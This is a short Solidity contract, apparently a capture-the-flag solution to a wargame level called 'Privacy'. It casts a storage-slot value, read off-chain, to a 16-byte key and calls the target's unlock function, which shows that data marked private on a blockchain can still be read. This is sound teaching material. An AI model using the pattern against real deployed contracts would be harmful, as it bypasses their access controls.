pragma solidity ^0.8.0;

interface Privacy{
    function unlock(bytes16  key)external;
}

contract PrivAtk {
    Privacy target;

    constructor(address _targetAddress) {
        target = Privacy(_targetAddress);
    }
    function unlock(bytes32 _slotvalue) public {
        bytes16 key = bytes16(_slotvalue);
        target.unlock(key);
    }
}